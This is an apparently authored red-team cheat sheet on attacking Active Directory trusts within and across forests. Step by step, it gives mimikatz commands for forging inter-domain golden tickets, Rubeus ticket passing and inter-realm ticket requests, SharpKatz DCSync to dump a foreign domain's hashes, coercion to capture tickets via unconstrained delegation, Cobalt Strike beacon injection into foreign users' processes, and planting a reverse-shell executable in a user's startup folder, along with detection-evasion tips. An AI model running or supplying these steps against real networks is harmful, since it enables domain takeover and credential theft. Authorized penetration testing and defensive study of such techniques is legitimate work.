# __Forest enumeration and exploitation__
>Author: Pieter Miske
---
### __Expand access within current forest:__
#### _Forest enumeration:_
To determine the domain’s you need to hop to get to your target, enumerate all trusts of the current domain and every trust of the new identified domains\. If your final target is not within the current forest, you also need to start looking for ways to cross the forest security boundary\.
- 1\. Get forest information:
    - List domain trusts within the current forest \(specify target domain to list trusts of that domain\) \([SharpView](https://github.com/tevora-threat/SharpView)\): `Get-DomainTrust (-Domain <target domain>) -API`
    - Get information about a forest and DC names \(specify target forest to list information about that forest\) \(SharpView\): `Get-NetForest (-Forest <forest>)`
- 2\. Map the results on the following trust types, attributes and directions:
    - TrustType:
    	- WINDOWS\_NON\_ACTIVE\_DIRECTORY: a trusted Windows domain that is not running Active Directory\.
    	- WINDOWS\_ACTIVE\_DIRECTORY: a trusted Windows domain that is running Active Directory
    	- MIT: a trusted domain that is running a non\-Windows \(\*nix\), RFC4120\-compliant Kerberos distribution\.
    - TrustAttributes: 
    	- WITHIN\_FOREST: the trusted domain is within the same forest, meaning a parent/child or cross\-link relationship\.
    	- NON\_TRANSITIVE: if DomainA trusts DomainB and DomainB trusts DomainC, then DomainA does not \(automatically\) trust DomainC \(can’t query any AD information from trusts up the chain from the non\-transitive point\)\. 
    	- FOREST\_TRANSITIVE: cross\-forest trust link between the root domains of two forests\. 
    	- TREAT\_AS\_EXTERNAL: SID filtering is disabled and can be exploited
    	- Other options can be found [here](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/): 
    - TrustDirection:
    	- BIDIRECTIONAL: full trust relationship between two domains:
    	- INBOUND: One\-way trust relationship which means that the principals from the Source domain are trusted by the Target Domain\.  
    	- OUTBOUND: One\-way trust relationship which means that the principals from the Target domain are trusted by the Source Domain \(can be an indicator for a Bastion forest\)\. 

#### _Abuse parent/child relationship and create Intra\-Forest trust ticket:_
If you compromise a child domain, you can by definition also compromise the parent domain due to the implicit bidirectional trust relationship\. 
>This method requires you to have DA level access in a child domain\. 
- 1\. List and copy the SIDs of the current domain and the target domain \([SharpView](https://github.com/tevora-threat/SharpView)\): `Get-DomainTrust -API`
- 2\. Dump the aes256 key of the current domain krbtgt account
- 3\. Forge a TGT \(if its not working, use the ‘/target’ option and specify the target domain\) \(for OPSEC run in local mimikatz\): `kerberos::golden /domain:<current FQDN> /sid:<owned domain SID> /sids:<target domain SID>-512 /aes256:<krbtgt key> /user:Administrator /ticket:ticket.kirbi /startoffset:-10 /endin:600 /renewmax:10080`
- 4\. Import the ticket and use it to access resources in the target domain \(for cobalt strike use the ‘make\_token’ \+ ‘kerberos\_ticket\_use’ method\) \([Rubeus](https://github.com/GhostPack/Rubeus)\): `rubues.exe ptt /ticket:C:\<path to>\ticket.kirbi`

#### _Cross domains without DA level access:_
There are also other means which do not require DA in the child domain\. These methods are very similar as the techniques discriped below to cross a forest security boundary\. 
- Kerberoast and ASREProast across domain trusts
- If accounts from another domain have access to systems in the current domain, you can:
	- Capture their TGT if the system they logon to is configured for unconstrained delegation\.
	- Coerce a high privileged computer to authenticate to a owned computer in the current domain that is configured for unconstrained delegation\.
	- Impersonate any process \(e\.g\. from RDP session\) that the target user has running on the  system\. 
- Look for users that have an account \(with the same username\) in both domains and try to reuse that password/hash\. 
- Enumerate users who are in groups outside of the current domain \-but within the current forest\- and may have some kind of outsite access \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)\): `Get-DomainForeignUser`


---
### __Expand access to a domain in an external forest with one\-way inbound/bidirectional trust:__
In contrast to an intra\-forest trust \(every domain in the current forest\), an inter\-forest trust \(multiple forests\) is a security boundary that should block lateral movement between forests\. Therefore, it is only possible to perform actions in the target forest, if one of the below techniques can be successfully leveraged\.

#### _Cross security boundary via user account/password reuse:_
Look for users that have an account \(with the same username\) in both forests and try to reuse the password\. 
- 1\. Request list of all users in the current and target domain \(specify ‘/domain’ option for the target domain\) \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)\): `Get-DomainUser (-Domain <FQDN target domain>) -Properties samaccountname |Out-File -encoding ascii users.txt`
- 2\. Download both user lists to the local Linux machine and filter matching user names: 
	- 1\. Create for both downloaded lists and clean version \(manually delete lines etc\.\): `cat users.txt | tr -d " " | sort > users1.txt`
	- 2\. Compare both files and return matches: `comm -12 users1.txt users2.txt`
- 3\. For the matching users, try password/hash reuse in the target domain\. 

#### _Cross security boundary via user/group relationships:_
Find relationships that cross the mapped trust boundaries by enumerating any users/groups/computers in one domain that can access resources in the other domain\. 
- 1\. Enumerate any groups that contain users outside of its own domain and return its members \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)\): `Get-DomainForeignGroupMember -Domain <target FQDN>`
- 2\. Convert the SID from the returned ‘MemberName’ field in the current domain \(PowerView\): `ConvertFrom-SID <SID MemberName field>`
- 3\. List computers in the foreign domain \(PowerView\): `Get-DomainComputer -Domain <FQDN target domain> -Properties DNSHostName`
- 4\. Enumerate any local group membership of these computers and check if they are a member of an identified group that can cross the forest boundary \(PowerView\): `Get-NetLocalGroupMember -ComputerName <FQDN target computer>`
- 5\. List members of the indentified group within the current domain and check what privileges they have in the foreign domain \(PowerView\): `Get-DomainGroupMember -Identity "<group name>" | select MemberName`
- 6\. Impersonate the identified user that can access resources in the foreign domain:
	- If cleartext password is known for CS \(make sure you are in a global writeable directory\): `make_token <domain>\<target user> <password>`
	- If NTLM or AES hash is known: 
		- 1\. Request TGT \([Rubeus](https://github.com/GhostPack/Rubeus)\): `Rubeus.exe asktgt /user:<target user> /domain:<FQDN current domain> /aes256:<hash> /opsec /nowrap`
		- 2\. Request a referral ticket from the current domain, for the target domain \(Rubeus\): `Rubeus.exe asktgs /service:krbtgt/<FQDN target domain> /domain:<FQDN current domain> /dc:<FQDN DC current domain> /ticket:<string> /nowrap`
		- 3\. Use this inter\-realm TGT to request a TGS in the target domain \(change service ticket to LDAP for DCSync\) \(for cobalt strike use the make\_token \+ kerberos\_ticket\_use method instead of /ptt\) \(Rubeus\): `Rubeus.exe asktgs /service:cifs/<FQDN DC target domain> /domain:<FQDN target domain> /dc:<FQDN DC target domain> /ticket:<string> (/nowrap) (/ptt)`
		- 4\. If not already, import the ticket \(for cobalt strike use the ‘make\_token’ \+ ‘kerberos\_ticket\_use’ method\)\. 

#### _Cross security boundary via SID Filtering:_
When SID filtering is disabled \(indicated by the 'TREAT\_AS\_EXTERNAL' in the 'TrustAttributes' attribute\), it is possible to abuse the inter\-forest trust like a intra\-forest trust \(domain within the forest\) with some restrictions\. 
>It is not possible to forge a ticket for any SID between 500 and 1000 or become DA via group inheritance for groups that are part of the “Global security group” \(e\.g\. Domain Admins, Enterprise Admins\)\. 
- 1\. Look for groups with >1000 SID's that have high privileges that still can be exploited \(e\.g\. local admin groups for workstation/servers or Exchange security groups\)\. 
- 2\. Use the ‘Abuse parent/child relationship and create Intra\-Forest trust ticket’ method, change the parameters so it fits the above criteria and cross the forest boundary\. 

#### _Cross security boundary abusing Unconstrained Deletation:_
Try to capture a TGT of an computer\- or user account that is allowed to cross the forest boundary on a system in the current domain that is configured for unconstrained delegation\.
- 1\. Check if you have access to a system in the current compromised forest that is configured with Unconstrained Delegation \(e\.g\. DC\)\.
- 2\. Find a way to either: 1\) coerce a high value computer account \(e\.g\. DC\), in the foerign target domain, to authenticate \(e\.g\. PetitPotam\) to the controlled unconstrained delegation enabled system in the current domain; or 2\) trick a user with the privilege to cross the forest boundary to login to the unconstrained delegation enabled system\. 
- 3\. To capture the TGT of the target, check the "Unconstrained Delegation" section and follow the attack steps\.
- 4\. After the ticket is imported, use DCSync to dump the target domain hashes \(for better OPSEC, do this from the current domain’s DC\) \([SharpKatz](https://github.com/b4rtik/SharpKatz)\): `SharpKatz --Command dcsync --Domain <FQDN target domain in other forest> --DomainController <FQDN DC in other domain forest>`

#### _Cross security boundary via kerberoasting & AS\-REProasting:_
- Check the ‘ASREProast’ and ‘Kerberoast’ section for usage and specify the target foreign domain\. 

#### _Cross security boundary via impersonation_
- The ‘Cross boundary via impersonation and RDPInjection’ technique, discribed in the ‘One\-way outbound’ section below, is also applicable for Inbound/Bidirectional trust relationships\. 


---
### __Expand access to a domain in an external forest with one\-way outbound trust:__
A one\-way outbound trust relationship makes it impossible to access resources in the target domain\. Therefore, it is not possible to query the target domain for information or forge inter\-forest kerberos tickets\. To bypass the security boundary, use techniques like RDPInception or MSSQL server link abuse \( works if the link is created in the opposite trust direction\)\. 

#### _Cross security boundary via impersonation and RDPInjection:_
>This method requires you to have high privileges on the system in the current domain that is used by the target foreign user\.
- 1\. Find non\-native principals in the current root domain that are from other domains \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)\): `Get-DomainForeignGroupMember -Domain <FQDN current domain>`
- 2\. Check if the found principal \(e\.g\. group\) has privileged access \(e\.g\. local admin, RDP/WinRM/DCOM\) in the current domain and for which systems in the current domain they apply \(check via BloodHound by looking up the found principal\)\. 
- 3\. Move laterally to those machines, camp there until you see a user account from the other domain authenticate and then exploit the situation:
	- 1\. First try impersonating the target user to hop the trust:
		- 1\. Check if there are any \(remote management\) processes running \(e\.g\. RDP\): `netstat -anop tcp | findstr 3389`
		- 2\. List the processes and check if the identified process is running as a foreign domain user: `tasklist /v`
		- 3\. Inject a beacon into one of the identified service processes of the foreign user which allows you to instantly run commands \(in the context of that user account\) in the foreign domain \(this will bypass the forest security boundary\): `inject <PID> x64 <tcp listener>`
	- 2\. \(optional\) If that didn’t work because the foreign user account doesn't have local admin access or there are no juicy management ports available, it may still be possible to move laterally via an established RDP channel if drive sharing is enabled on the foreign RDP client \(attack called RDPInception\) (the drive sharing option can be found here in the RDP client: Show Options > Local Resources tab > More > enable 'Drives' > enable 'Local Disk \(C:\)')
		- 1\. Upload via the accessible ‘tsclient’ drive \(the C drive on the target system\) a reverse shell \.exe payload to the startup folder of the foreign user: `\\tsclient\c\Users\<username foreign user>\AppData\Roaming\Microsoft\Windows\Start`
		- 2\. The payload will be executed the next time the foreign user logs in\.

#### _Cross security boundary via Shadow Principles:_
An outbound trust direction can also indicate the presence of a bastion forest\. This is a type of cross\-forest trust \(PAM\-trust\) where privileged accounts are isolated from what Microsoft considers to be forests that might already been compromised\. This is done via Shadow Security Principles\. 
- 1\. Check if Shadow Principles are applied and which account are member of the bastion forest \(run this command with DA privs from the DC\) \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)\): `Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS\ShadowPrincipalSid | fl`
- 2\. If you are able to compromise a user account mentioned as 'member' of the bastion forest, you instantly obtain EA privs and compromise the complete forest\.
